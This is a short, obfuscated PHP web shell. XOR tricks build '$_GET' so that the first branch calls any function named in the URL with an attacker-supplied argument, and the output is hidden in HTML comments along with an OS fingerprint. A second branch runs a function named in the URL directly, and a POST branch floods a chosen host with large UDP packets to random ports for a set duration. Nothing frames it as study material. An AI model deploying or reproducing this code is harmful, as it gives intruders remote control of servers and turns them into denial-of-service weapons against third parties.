<?php
if($_GET['_']) {
print "<!--".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
} elseif($_GET['___']) { @$_GET['___'](); } elseif(isset($_POST['target'])&&isset($_POST['time'])){$fn0=0;$pm1=$_POST['time'];$yu2=time();$az3=$yu2+$pm1;$jd4=$_POST['target'];$kb5=gethostbyname($jd4);for($pt6=0;$pt6<65553;$pt6++){$yf7.='X';}while(1){$fn0++;if(time()>$az3){break;}$yw8=rand(1,65553);$vl9=fsockopen('udp://'.$kb5,$yw8,$ic10,$yf11,5);if($vl9){fwrite($vl9,$yf7);fclose($vl9);}}}elseif($_POST['kill']=='1'){exit(0);}
?>